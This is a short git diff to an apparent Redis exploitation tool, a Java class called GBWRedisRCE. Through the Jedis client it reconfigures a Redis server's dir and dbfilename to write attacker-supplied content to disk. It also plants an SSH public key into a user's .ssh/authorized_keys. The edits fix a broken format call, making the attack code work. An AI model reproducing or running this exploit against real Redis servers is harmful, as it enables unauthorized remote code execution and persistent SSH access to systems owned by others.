@@ -132,7 +132,7 @@ public class GBWRedisRCE {
         String content = new String(Files.readAllBytes(path));
         prepare(jedis);
         printCmd("config set dir "+dir,jedis.configSet("dir",dir));
-        printCmd("set xx "+content,jedis.set("xx",content));
+        printCmd("set x "+content,jedis.set("x",content));
         printCmd("config set dbfilename "+fname,jedis.configSet("dbfilename",fname));
         printCmd("save",jedis.save());
 
@@ -146,13 +146,13 @@ public class GBWRedisRCE {
         String user = kk[0];
         String key = kk[1];
 
-        String authPath = String.format("%s/.ssh/");
+        String authPath = String.format("%s/.ssh/",user);
         String auth = "authorized_keys";
 
 
         prepare(jedis);
         printCmd("config set dir "+authPath,jedis.configSet("dir",authPath));
-        printCmd("set xxx "+key,jedis.set("xxx",key));
+        printCmd("set x "+key,jedis.set("x",key));
         printCmd("config set dbfilename "+auth,jedis.configSet("dbfilename",auth));
         printCmd("save",jedis.save());
 
